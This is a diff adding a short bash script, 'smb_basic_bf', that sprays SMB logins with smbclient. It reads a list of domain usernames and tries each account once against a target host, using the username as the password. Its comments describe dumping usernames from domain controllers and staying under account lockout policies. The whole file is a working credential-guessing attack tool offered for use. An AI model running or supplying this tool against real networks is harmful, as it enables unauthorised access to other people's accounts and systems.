@@ -1,0 +1,28 @@
+#!/bin/bash
+
+# smb_basic_bf:  smbclient-based password cracker for domains that have account lockout policies
+# the idea is to dump all the domain usernames (using your favorite netbios tool)
+# from any of the domain controllers in the target network.
+# then try just one authentication attempt per account with a password equals to the username
+# (i.e.: testuser/testuser) using this script.
+
+# trying only one or two passwords attempts against each account with a long list of usernames
+# is what I like to call username bruteforcing rather than password bruteforcing.
+
+if [[ $# -ne 2 ]]
+then
+        echo "$0 <hostname-or-ip> <usernames-filename>"
+        exit 1
+fi
+
+
+for USERNAME in `cat $2`
+do
+        echo "trying next: $USERNAME/$USERNAME";
+        if smbclient \\\\$1\\ipc$ -U $USERNAME $USERNAME | grep 'NT_STATUS_LOGON_FAILURE' > /dev/null 
+        then
+                echo "not found" > /dev/null
+        else
+                echo "Found: $USERNAME/$USERNAME"
+        fi
+done
